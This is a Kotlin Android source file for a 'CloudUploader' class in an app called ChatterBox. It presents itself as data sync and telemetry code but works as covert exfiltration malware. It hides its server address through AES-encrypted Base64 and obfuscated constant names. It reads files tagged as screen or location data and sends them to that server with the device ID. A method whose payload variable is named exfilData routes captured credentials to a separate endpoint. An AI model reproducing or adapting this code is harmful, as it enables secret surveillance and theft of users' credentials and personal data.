package com.example.ChatterBox.database

import android.annotation.SuppressLint
import android.content.Context
import android.os.AsyncTask
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import org.json.JSONObject
import java.io.File
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.security.SecureRandom
import java.util.LinkedList
import java.util.Queue
import javax.crypto.Cipher
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec

@SuppressLint("HardwareIds")
class CloudUploader(private val context: Context) {
    private val TAG = "DataSync"
    private val syncQueue: Queue<SyncItem> = LinkedList()
    private val handler = Handler(Looper.getMainLooper())
    private var isSyncing = false

object SyncConfig {
    // Encrypted Base64 of the IP "http://192.168.86.37:42069/api/"
    private const val A1001 = "1Ei/1RaFl5NZkgNPX8ZhQRTbaRVWiwXpl6WWEYg9pj3jsGwV9vz6kYbQ0aRj5kunL+b88dEwec/2RAnPkCBXeQ=="
    const val B1001 = "ThisIsAFakeKey16"

    private fun decryptEndpoint(): String {
        val encryptedBytes = android.util.Base64.decode(A1001, android.util.Base64.DEFAULT)

        val iv = encryptedBytes.copyOfRange(0, 16)
        val encrypted = encryptedBytes.copyOfRange(16, encryptedBytes.size)

        val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
        val keySpec = SecretKeySpec(B1001.toByteArray(), "AES")
        val ivSpec = IvParameterSpec(iv)

        cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec)

        val decryptedBytes = cipher.doFinal(encrypted)
        return String(decryptedBytes)
    }

    // API_ENDPOINT
    val A1002: String by lazy { decryptEndpoint() }
    //SYNC_ENDPOINT
    val A1003: String by lazy { "${A1002}sync" }
    // ANALYTICS_ENDPOINT
    val A1004: String by lazy { "${A1002}analytics" }
    // TELEMETRY_ENDPOINT
    val A1005: String by lazy { "${A1002}telemetry" }
}

    private val deviceId: String by lazy {
        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
    }

    fun enqueueUpload(dataType: String, filePath: String) {
        synchronized(syncQueue) {
            syncQueue.add(SyncItem(dataType, filePath))
        }
    }

    fun startUploadJob() {
        if (isSyncing) return

        isSyncing = true

        try {
            synchronized(syncQueue) {
                if (syncQueue.isEmpty()) {
                    isSyncing = false
                    return
                }

                val batchSize = 3
                val batch = mutableListOf<SyncItem>()

                repeat(minOf(batchSize, syncQueue.size)) {
                    syncQueue.poll()?.let { batch.add(it) }
                }

                sendBatch(batch)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error during data sync: ${e.message}")
        } finally {
            isSyncing = false
        }
    }

    private fun sendBatch(batch: List<SyncItem>) {
        if (batch.isEmpty()) return

        val request = JSONObject().apply {
            put("device_id", deviceId)
            put("app_version", getAppVersion())
            put("timestamp", System.currentTimeMillis())
            put("sync_type", "incremental")

            val dataArray = JSONObject()
            batch.forEach { item ->
                try {
                    val file = File(item.filePath)
                    if (file.exists()) {
                        val content = file.readBytes()
                        val encrypted = secureBlob(content)
                        val encoded = android.util.Base64.encodeToString(encrypted, android.util.Base64.DEFAULT)

                        dataArray.put(file.name, encoded)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error processing ${item.dataType} file: ${e.message}")
                }
            }
            put("payload", dataArray)
        }

        val endpoint = when {
            batch.any { it.dataType.contains("screen") } -> SyncConfig.A1005
            batch.any { it.dataType.contains("location") } -> SyncConfig.A1004
            else -> SyncConfig. A1003
        }
        SendDataTask(endpoint, request.toString()).execute()
    }

    private fun secureBlob(data: ByteArray): ByteArray {
        try {
            val iv = ByteArray(16).apply {
                SecureRandom().nextBytes(this)
            }

            val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
            val key = SecretKeySpec(SyncConfig.B1001.toByteArray(), "AES")
            val ivParameterSpec = IvParameterSpec(iv)

            cipher.init(Cipher.ENCRYPT_MODE, key, ivParameterSpec)

            val encrypted = cipher.doFinal(data)
            val result = ByteArray(iv.size + encrypted.size)
            System.arraycopy(iv, 0, result, 0, iv.size)
            System.arraycopy(encrypted, 0, result, iv.size, encrypted.size)

            return result
        } catch (e: Exception) {
            Log.e(TAG, "Encryption error", e)
            throw e
        }
    }

    private fun getAppVersion(): String {
        return try {
            context.packageManager.getPackageInfo(context.packageName, 0).versionName ?: "1.0.0"
        } catch (e: Exception) {
            "1.0.0"
        }
    }

    fun postJson(dataType: String, data: String) {
        try {
            val exfilData = JSONObject().apply {
                put("device_id", deviceId)
                put("type", dataType)
                put("timestamp", System.currentTimeMillis())
                put("data", data)
            }

            val endpoint = when (dataType) {
                "login_event" -> "${SyncConfig.A1002}analytics"
                "credentials" -> "${SyncConfig.A1002}auth/validate"
                else -> "${SyncConfig.A1002}data"
            }

            SendDataTask(endpoint, exfilData.toString()).execute()
        } catch (e: Exception) {
            Log.e(TAG, "Data sync error: ${e.message}")
        }
    }

    @Suppress("DEPRECATION")
    private inner class SendDataTask(
        private val endpoint: String,
        private val jsonData: String
    ) : AsyncTask<Void, Void, Boolean>() {

        override fun doInBackground(vararg params: Void): Boolean {
            try {
                val url = URL(endpoint)
                val connection = url.openConnection() as HttpURLConnection

                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.setRequestProperty("User-Agent", "ChatterBox/${getAppVersion()}")
                connection.setRequestProperty("X-Device-ID", deviceId)

                connection.connectTimeout = 15000
                connection.readTimeout = 15000
                connection.doOutput = true
                connection.doInput = true

                try {
                    OutputStreamWriter(connection.outputStream).use { writer ->
                        writer.write(jsonData)
                        writer.flush()
                    }

                    val responseCode = connection.responseCode
                    Log.d(TAG, "API sync response: $responseCode")

                    return responseCode == HttpURLConnection.HTTP_OK
                } finally {
                    connection.disconnect()
                }
            } catch (e: Exception) {
                Log.e(TAG, "Sync error: ${e.message}")
                return false
            }
        }

        override fun onPostExecute(result: Boolean) {
            Log.d(TAG, "Data sync completed: $result")
        }
    }

    private data class SyncItem(val dataType: String, val filePath: String)
}